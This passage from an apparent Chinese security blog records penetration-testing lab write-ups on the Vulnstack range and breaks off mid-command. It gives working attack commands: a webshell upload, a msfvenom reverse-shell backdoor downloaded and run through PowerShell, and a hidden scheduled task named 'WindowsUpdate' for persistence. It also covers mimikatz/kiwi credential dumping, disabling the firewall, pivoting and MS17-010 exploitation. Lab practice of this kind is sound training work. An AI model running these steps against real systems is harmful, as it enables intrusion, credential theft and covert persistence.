<strong>黄金票据</strong> ，回头学习一下再利用</p><p>用msf的kiwi查查密码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta"># meterpreter</span><br>load kiwi<br>help kiwi<br>kiwi_cmd sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><h5 id="关掉防火墙"><a href="#关掉防火墙" class="headerlink" title="关掉防火墙"></a>关掉防火墙</h5><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="内网收集1-cs"><a href="#内网收集1-cs" class="headerlink" title="内网收集1 - cs"></a>内网收集1 - cs</h5><p>利用cs已上线的靶机扫描内网存活主机</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># cs beacon</span><br><span class="hljs-attribute">portscan</span> <span class="hljs-number">10.10.10.1</span>-<span class="hljs-number">10.10.10.255</span> <span class="hljs-number">445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span> arp <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205161854262.png" alt="image-20231205161854262"></p><p>存活主机 <code>10, 80(当前靶机), 201</code></p><h5 id="内网收集2-msf"><a href="#内网收集2-msf" class="headerlink" title="内网收集2 - msf"></a>内网收集2 - msf</h5><p>msf挂个路由</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># meterpreter</span><br><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">bg</span><br></code></pre></td></tr></table></figure><p>用msf扫一下开放的端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># msf</span><br><span class="hljs-attribute">search</span> portscan<br><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> rhost <span class="hljs-number">10.10.10.10</span>(<span class="hljs-number">10.10.10.201</span>)<br><span class="hljs-attribute">set</span> ports <span class="hljs-number">1</span>-<span class="hljs-number">10000</span>(默认)<br><span class="hljs-attribute">set</span> concurrency <span class="hljs-number">1000</span>(端口扫描速度，默认<span class="hljs-number">10</span>，改<span class="hljs-number">1000</span>直接起飞~)<br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure><p><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205165146786.png" alt="image-20231205165146786"><img src="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/image-20231205170345103.png" alt="image-20231205170345103"></p><h5 id="内网收集3-fscan"><a href="#内网收集3-fscan" class="headerlink" title="内网收集3 - fscan"></a>内网收集3 - fscan</h5><p><code>kernel32.dll not found</code> 奇了怪了，明明有这个加载库，但是启动不起来，查了很多解决方法都不行，上次也是这个问题，先搁置。</p><p>好家伙，登录不上，机子又日坏了，哎</p><p>剩下的大概就是找一下漏洞然后利用(永恒之蓝之类的，没啥新奇)</p>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>学习</tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnstack靶场日记-1</title>
    <link href="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/"/>
    <url>/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="关于vulnstack"><a href="#关于vulnstack" class="headerlink" title="关于vulnstack"></a>关于vulnstack</h3><p>国内的渗透测试靶场，由红日安全团队打造。</p><p>卖课的，但是靶场用来练手还不错。</p><p>目前共有八个靶场，最大的60个G，小的也有20多个G，模拟从外网到内网的过程，<a href="http://vulnstack.qiyuanxuetang.net/vuln/">链接</a></p><p>由于每个靶场都是单独的环境，不只局限于某个特定漏洞，所以我们用 [靶场+序号] 的形式命名</p><h3 id="靶场一"><a href="#靶场一" class="headerlink" title="靶场一"></a>靶场一</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ol><li>下载后解压，共有三台机子 win7、win2003、winserver 2008 R2，默认密码 <code>hongrisec@2019</code>，但是我的2003密码错误登不上，IP地址需要自己找</li><li>攻击机 kali</li><li>win7 利用phpstudy打开网络服务(可以用everything搜索phpstudy)，本机尝试访问 <code>http://127.0.0.1</code> 检查是否开启</li></ol><h4 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h4><p>需要搭建两个局域网，我使用的VMware，添加两个网络适配器(原有的NET加任意VMnet)，此处我使用net 加 VMnet2，如图</p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130144157472.png" alt="image-20231130144157472"><p>其中，kali 和 win7 接入NET，模拟外网，win7、win2003、win server 2008 接入 VMnet2，模拟内网</p><h5 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h5><ul><li>kali        192.168.48.129</li><li>win7      192.168.48.138</li></ul><h5 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h5><ul><li>win7                       192.168.52.143</li><li>win2003                192.168.52.141(同网段自己测试出来的，因为密码错误登陆不上)</li><li>winServer             192.168.52.138</li></ul><h5 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h5><ul><li>win7 可以ping通所有ip</li><li>所有ip均不可ping通win7(防火墙)</li><li>win2003 和 winServer 可以互相ping通</li></ul><h4 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h4><p>kali -&gt; win7</p><h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><ol><li><p>netdiscover 发现 ip 192.168.48.138，nmap 扫端口开放80和3306端口<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130150409166.png" alt="image-20231130150409166"></p></li><li><p>浏览器访问，发现phpstudy探针，初步查看：安全模式没开、魔术引号没开、禁用函数为空、mysql弱口令 <code>root  root</code> 成功连接，可以说毫无防备漏洞百出了<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152957440.png" alt="image-20231130152957440"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130152929871.png" alt="image-20231130152929871"></p></li><li><p>dirb扫一下，出了以下内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">phpinfo<br><span class="hljs-function"><span class="hljs-title">phpmyadmin</span><span class="hljs-params">(弱口令root/root)</span></span><br>phpmyadmin/changelog php版本<span class="hljs-number">3.5</span>.<span class="hljs-number">8.2</span>  初步判断没有可直接拿shell的途径<br></code></pre></td></tr></table></figure><p>加后缀重新扫</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.138</span> <span class="hljs-string">/usr/share/dirb/wordlists/big.txt</span> -X <span class="hljs-string">.php</span>,<span class="hljs-string">.zip</span>,<span class="hljs-string">.7z</span>,<span class="hljs-string">.rar</span>（windows压缩方式为zip、rar）<br>出了个beifen.rar<br></code></pre></td></tr></table></figure></li><li><p>下载并解压 beifen.rar ，发现yxcms(1.2.1)网站源码<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163455279.png" alt="image-20231130163455279"></p><p>后台地址 <code>/yxcms/index.php?r=admin</code> 默认密码 <code>admin/123456</code>   <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130163739198.png" alt="image-20231130163739198"></p></li></ol><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol><li><p>成功登入yxcms管理后台，搜索1.2.1版本漏洞，发现前台模板处存在任意文件上传，编写上传一句话，蚁剑成功连接<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165352796.png" alt="image-20231130165352796"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.138</span><span class="hljs-regexp">/yxcms/</span>protected<span class="hljs-regexp">/apps/</span>default<span class="hljs-regexp">/view/</span>default/shell.php<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130165416984.png" alt="image-20231130165416984"></p></li><li><p>直接拿到用户权限(此处为administrator)</p></li></ol><h5 id="提权1-msf-getsystem"><a href="#提权1-msf-getsystem" class="headerlink" title="提权1 - msf getsystem"></a>提权1 - msf getsystem</h5><ol><li><p>利用Msfvenom创建后门程序</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">msfvenom -<span class="hljs-selector-tag">a</span> x86 <span class="hljs-attr">--platform</span> windows -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">48.129</span> LPORT=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> “\x00” -e x86/shikata_ga_nai -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10</span> -f exe -o /var/www/html/safe<span class="hljs-selector-class">.exe</span><br><br>-a： 指定架构如x86 x64。x86代表<span class="hljs-number">32</span>位，x64代表<span class="hljs-number">64</span>位。<span class="hljs-number">32</span>位软件可以在<span class="hljs-number">64</span>位系统上运行。所以我们生成<span class="hljs-number">32</span>位的后门，这样在<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位系统中都可以使用。<br>–platform： 指定平台，这里选择windows，通过–l platforms可以查看所有支持的平台。<br>-<span class="hljs-selector-tag">p</span>: 设置攻击载荷，我们使用windows/meterpreter/reverse_tcp，可以通过-l payloads查看所有攻击载荷。<br>**LHOST:**目标主机执行程序后连接我们Kali的地址LPORT目标主机执行程序后连接我们Kali的端口<br>-<span class="hljs-selector-tag">b</span>: 去掉坏字符，坏字符会影响payload 正常执行。<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130171219723.png" alt="image-20231130171219723"></p></li><li><p>python开启http服务，在win上下载后门文件并执行，在msf上监听</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># kali</span><br>python -m http.<span class="hljs-keyword">server</span> <span class="hljs-number">9999</span><br><br><span class="hljs-meta"># win7(通过蚁剑的命令行执行)</span><br>powershell (<span class="hljs-keyword">new</span>-object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.48.129:9999/safe.exe&#x27;</span>,<span class="hljs-string">&#x27;safe.exe&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msfconsole</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.48.129<br><span class="hljs-built_in">set</span> lport 4444(默认)<br>exploit<br><br><span class="hljs-comment"># win7</span><br>运行safe.exe<br></code></pre></td></tr></table></figure><p>欧~了<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172215581.png" alt="image-20231130172215581"></p></li><li><p>getsystem提权<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231130172541423.png" alt="image-20231130172541423"></p></li></ol><h5 id="提权2-systeminfo-提权辅助"><a href="#提权2-systeminfo-提权辅助" class="headerlink" title="提权2 - systeminfo + 提权辅助"></a>提权2 - systeminfo + 提权辅助</h5><ol><li>我们利用命令行(蚁剑或者meterpreter的shell)执行 <code>systeminfo</code> 指令，查看系统信息和安装的补丁</li><li>利用提权辅助网页 <a href="https://i.hacking8.com/tiquan/">提权辅助网页 Windows提权辅助 (hacking8.com)</a> 查看可用的payload<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201122155255.png" alt="image-20231201122155255"></li></ol><h5 id="提权3-提权辅助工具-payload利用"><a href="#提权3-提权辅助工具-payload利用" class="headerlink" title="提权3 - 提权辅助工具 + payload利用"></a>提权3 - 提权辅助工具 + payload利用</h5><p>利用提权辅助工具 <a href="https://github.com/carlospolop/PEASS-ng">carlospolop&#x2F;PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors) (github.com)</a> 查看可利用的提权项，教程： <a href="https://blog.csdn.net/weixin_43571641/article/details/124374117">全平台系统提权辅助工具 PEASS-ng</a> </p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-comment"># 此处用的bat执行结果不带有彩色标注</span><br>winPEAS.bat &gt; <span class="hljs-built_in">result</span>.txt<br><span class="hljs-keyword">type</span> <span class="hljs-built_in">result</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201131030392.png" alt="image-20231201131030392"></p><p>根据可利用的payload提权即可</p><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><ol><li><p>隐藏后门文件</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">attrib</span> <span class="hljs-type">C</span>:\<span class="hljs-keyword">safe</span>.exe +s +h<br><span class="hljs-meta"># +s 设置系统属性</span><br><span class="hljs-meta"># +h 设置隐藏属性</span><br><span class="hljs-meta"># 取消隐藏把 + 改为 -</span><br></code></pre></td></tr></table></figure></li><li><p>创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /create /tn WindowsUpdate /tr <span class="hljs-string">&quot;C:\safe.exe&quot;</span> /sc minute /mo 1<br><span class="hljs-comment"># /create 创建任务</span><br><span class="hljs-comment"># /tn TaskName 任务名称</span><br><span class="hljs-comment"># /tr TaskRun 文件路径</span><br><span class="hljs-comment"># /sc schedule 时间单位</span><br><span class="hljs-comment"># /mo 时间数值</span><br><br><span class="hljs-comment"># 删除命令</span><br>schtasks /delete /tn WindowsUpdate<br></code></pre></td></tr></table></figure></li></ol><h5 id="cs自动化插件"><a href="#cs自动化插件" class="headerlink" title="cs自动化插件"></a>cs自动化插件</h5><p><a href="https://cloud.tencent.com/developer/article/1484238">CobaltStrike权限维持及其自动化-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h5 id="更多维权技巧"><a href="#更多维权技巧" class="headerlink" title="更多维权技巧"></a>更多维权技巧</h5><p><a href="https://www.freebuf.com/articles/system/229209.html">权限维持及后门持久化技巧总结 - FreeBuf网络安全行业门户</a></p><h4 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h4><h5 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h5><p>使用msf的hashdump功能，可直接获取用户密码的md5值<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201153045335.png" alt="image-20231201153045335"></p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p><a href="https://blog.csdn.net/weixin_40412037/article/details/113348310">内网渗透神器（Mimikatz）——使用教程-CSDN博客</a></p><p>前文已经拿到了system权限，利用相关工具可从系统或注册表获取明文密码(需上传mimikatz工具)</p><h5 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h5><p>msf上内置了mimikatz模块，改名为kiwi，可以直接使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># meterpreter &gt;</span><br><br><span class="hljs-comment"># 先进程迁移(之前传递的后门文件是32位的，需要迁移到任意64位进程)</span><br><span class="hljs-attribute">ps</span><br><span class="hljs-attribute">migrate</span> <span class="hljs-number">384</span>(任意<span class="hljs-number">64</span>位进程pid)<br><br><span class="hljs-attribute">load</span> kiwi<br><span class="hljs-attribute">kiwi_cmd</span> sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201154424561.png" alt="image-20231201154424561"> </p><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><p>我们目前取得了win7的管理员权限，下一步发现内网其他主机、扫描漏洞并尝试利用</p><h5 id="靶机下载文件"><a href="#靶机下载文件" class="headerlink" title="靶机下载文件"></a>靶机下载文件</h5><p>我们拿到一个靶机的shell后，可能会有在靶机上下载或上传文件的需要，有些在攻击机上，有些在网络环境(不出网的就只能通过其他靶机的代理或者内网穿透)</p><ol><li><p><strong>powershell</strong> (拿之前上传后门文件举例)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell (<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> <span class="hljs-keyword">System</span>.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.48.129:9999/safe.exe&#x27;</span>,<span class="hljs-string">&#x27;safe.exe&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p><strong>wget</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># wget下载地址</span><br><span class="hljs-symbol">https:</span>//eternallybored<span class="hljs-meta">.org</span>/misc/wget/<br></code></pre></td></tr></table></figure></li><li><p><strong>winscp</strong>远程桌面</p></li><li><p><strong>meterpreter</strong> upload</p></li></ol><p><a href="https://zhuanlan.zhihu.com/p/132644184">Windows远程文件下载执行的15种姿势 - 知乎 (zhihu.com)</a></p><h5 id="内网收集1-fscan"><a href="#内网收集1-fscan" class="headerlink" title="内网收集1 - fscan"></a>内网收集1 - fscan</h5><ul><li><p><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a></p></li><li><p>上传fscan到靶机并运行 <code>fscan.exe -h 192.168.52.1/24</code></p></li><li><p>运行报错了，查文档说需要配置go环境，麻烦</p></li></ul><h5 id="内网收集2-cs代理"><a href="#内网收集2-cs代理" class="headerlink" title="内网收集2 - cs代理"></a>内网收集2 - cs代理</h5><ol><li><p>先生成一个win后门程序，按照前文方式，依次上传、运行、创建定时任务、隐藏文件(如果一开始就用cs神器也没这么多事了hhh)<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171640358.png" alt="image-20231201171640358"></p></li><li><p>关于cs的安装和使用参考文章末尾相关资源，此处直接走socks代理<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171841342.png" alt="image-20231201171841342"></p></li><li><p>修改 <code>/etc/proxychains.conf</code> 的 sock4 为 <code>127.0.0.1 11451</code> , 并在<code>meterpreter</code> 中执行以下命令</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">setg Proxies socks<span class="hljs-number">4:127.0.0</span>.<span class="hljs-number">1:11451</span><br></code></pre></td></tr></table></figure></li><li><p>接下来便可以利用我们本地的工具进行扫描</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># netdiscover</span><br><span class="hljs-attribute">proxychains</span> netdiscover<br><br><span class="hljs-comment"># nmap</span><br><span class="hljs-attribute">proxychains</span> nmap -A -sS -sV <span class="hljs-number">192.168.52.138</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>速度感人<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202113659562.png" alt="image-20231202113659562"></p></li><li><p>换个思路，在靶机上上传nmap进行扫描(桌面截图发现居然自带的有)，地址为 <code> C:\Program Files (x86)\Nmap</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> nmap -A -sS -sV <span class="hljs-number">192.168.52.138</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115734625.png" alt="image-20231202115734625"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115808187.png" alt="image-20231202115808187"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120036461.png" alt="image-20231202120036461"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120108061.png" alt="image-20231202120108061"></p></li></ol><h5 id="内网收集3-msf路由"><a href="#内网收集3-msf路由" class="headerlink" title="内网收集3 - msf路由"></a>内网收集3 - msf路由</h5><p>上面的cs代理不知道抽什么风用不了，这里改用msf的路由</p><ol><li><p>msf利用 <code>epxloit/multi/handler</code> 模块，监听本机的 <code>4444</code> 端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"># msf<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">192.168.48.129</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444(</span>默认<span class="hljs-comment">)</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure></li><li><p>之前设置里计划任务(safe.exe)，很快就回传过来，执行语句将当前session创建为路由</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># meterpreter</span><br>ps<br>migrate <span class="hljs-number">384</span>(任意x64进程，此处选择wininit)<br><span class="hljs-keyword">run</span><span class="language-bash"> post/multi/manage/autoroute</span><br></code></pre></td></tr></table></figure><p>此时报错 <code>session, expected Session object got Msf::Sessions::Meterpreter_x86_Win</code></p><p>猜测是之前上传的32位马子不符合要求，我们重新上传一个64位的马子。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.48.129  <span class="hljs-attribute">LPORT</span>=4444 -f exe -o safe_64.exe<br></code></pre></td></tr></table></figure></li><li><p>按照之前的方式依次上传、隐藏、计划任务、并在msf进行监听，此时再开启路由模块便正常了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.48.129<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br><br><span class="hljs-comment"># meterpreter&gt;</span><br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202192155216.png" alt="image-20231202192155216"></p></li><li><p>路由开启后我们尝试进行arp扫描，非常的舒服啊</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># meterpreter&gt;</span><br><span class="hljs-built_in">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">rhosts</span>=192.168.52.0/24<br><br><span class="hljs-comment"># 当前会话挂后台</span><br>bg(background)<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203115302684.png" alt="image-20231203115302684"></p></li></ol><h5 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h5><ol><li><p>nmap漏扫插件扫一扫</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># cs beacon&gt;</span><br><span class="hljs-built_in">shell</span> nmap <span class="hljs-comment">--script=vuln 192.168.52.141</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202121821429.png" alt="image-20231202121821429"></p><p>ms08-067  ms17-010</p></li><li><p>需要先关闭win7的防火墙，否则会出现以下内容<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202143323918.png" alt="image-20231202143323918"></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># 关闭防火墙 cs beacon&gt;</span><br>shell netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure></li><li><p>前面拿到了内网的路由(或者代理)，此处用msf进行漏洞发现和利用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf&gt;</span><br>use auxiliary/scanner/smb/smb_ms17_010<br>show options<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203120354256.png" alt="image-20231203120354256"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-built_in">set</span> rhost 192.168.52.141<br><span class="hljs-built_in">set</span> payload windows/meterpreter/bind_tcp(必须是<span 